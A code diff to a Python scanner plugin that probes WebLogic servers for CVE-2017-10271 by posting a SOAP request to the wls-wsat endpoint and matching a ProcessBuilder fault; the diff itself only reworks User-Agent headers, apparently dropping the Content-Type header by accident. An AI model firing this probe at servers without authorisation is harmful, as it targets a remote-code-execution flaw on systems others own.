@@ -1,12 +1,13 @@
 import requests
 from lib.verify import verify
-from lib.random_header import HEADERS
+from lib.random_header import get_ua
 
 vuln = ['http', 'weblogic', '7001']
 
 
 def check(ip, ports, apps):
     if verify(vuln, ports, apps):
+        HEADERS = get_ua()
         HEADERS.update({'Content-Type': 'text/xml'})
         url = 'http://{}:7001/wls-wsat/CoordinatorPortType'.format(ip)
         data = '''
@@ -34,12 +35,12 @@ def check(ip, ports, apps):
         <soapenv:Body/>
         </soapenv:Envelope>
             '''
-
+        
         try:
-            r = requests.post(url, data=data, verify=False, timeout=5, headers=HEADERS)
+            r = requests.post(url, data=data, verify=False, timeout=5, headers=get_ua())
             text = r.text
         except Exception:
             text = ""
-
+        
         if '<faultstring>java.lang.ProcessBuilder' in text or "<faultstring>0" in text:
             return ('CVE-2017-10271 Weglogic RCE {}'.format(url))
